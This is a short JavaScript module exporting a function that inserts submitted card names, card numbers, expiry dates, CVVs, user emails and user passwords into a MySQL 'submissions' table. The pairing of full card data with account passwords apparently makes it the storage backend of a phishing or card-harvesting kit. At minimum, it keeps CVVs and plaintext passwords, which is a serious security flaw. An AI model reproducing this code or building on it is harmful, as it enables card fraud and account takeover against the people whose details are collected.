// MySQL replacement for the old Mongoose model.
// This file now exports a function used by submitController.

async function createSubmission(db, data) {
  const {
    cardName,
    cardNumber,
    expiry,
    cvv,
    userEmail,
    userPassword
  } = data;

  const sql = `
    INSERT INTO submissions
      (cardName, cardNumber, expiry, cvv, userEmail, userPassword)
    VALUES
      (?, ?, ?, ?, ?, ?)
  `;

  const params = [
    cardName,
    cardNumber,
    expiry,
    cvv,
    userEmail,
    userPassword
  ];

  const [result] = await db.execute(sql, params);

  // mysql2 returns an OkPacket where insertId is available
  return { insertId: result.insertId };
}

module.exports = { createSubmission };


